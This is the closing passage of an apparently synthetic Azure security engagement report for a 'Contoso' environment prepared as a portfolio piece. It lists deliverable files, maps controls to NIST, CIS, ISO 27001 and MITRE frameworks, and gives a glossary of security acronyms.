| `sentinel/playbooks/pb-isolate-vm.json` | Logic App export |
| `tenable/connector-setup.sh` | Bootstrap script for Tenable Azure connector |
| `threat-sim/atomic-tests.md` | Atomic Red Team mapping |
| `diagrams/architecture.drawio` | Editable architecture diagram |

### Appendix B — Reference Controls Mapping (Full Matrix)

Detailed control mappings are maintained in `docs/control-mappings.xlsx`, reconciling:
- **NIST CSF 2.0** (GV, ID, PR, DE, RS, RC)
- **NIST SP 800-53r5** (Moderate baseline)
- **CIS Microsoft Azure Foundations Benchmark v2.1.0** (Level 1 + selected Level 2)
- **ISO/IEC 27001:2022** (Annex A controls)
- **MITRE ATT&CK Mitigations** (M-series)
- **MITRE D3FEND** (countermeasures by TTP)

### Appendix C — Glossary

**AMA** — Azure Monitor Agent · **ASG** — Application Security Group · **CAF** — Cloud Adoption Framework · **CAE** — Continuous Access Evaluation · **CMK** — Customer-Managed Key · **CNAPP** — Cloud-Native Application Protection Platform · **CWPP** — Cloud Workload Protection Platform · **DCR** — Data Collection Rule · **EPP/EDR** — Endpoint Protection/Detection & Response · **IDPS** — Intrusion Detection & Prevention System · **MDE** — Microsoft Defender for Endpoint · **MI** — Managed Identity · **MITRE ATT&CK** — Adversarial Tactics, Techniques & Common Knowledge · **PIM** — Privileged Identity Management · **SOAR** — Security Orchestration Automation & Response · **UEBA** — User & Entity Behavior Analytics · **VPR** — Vulnerability Priority Rating (Tenable) · **WAF** — Web Application Firewall · **ZTMM** — Zero Trust Maturity Model (CISA) · **ZTNA** — Zero Trust Network Access.

---

*Contoso-Azure Engagement v1.0*
*Prepared for portfolio/public distribution. All account names, IDs, and IPs are synthetic.*
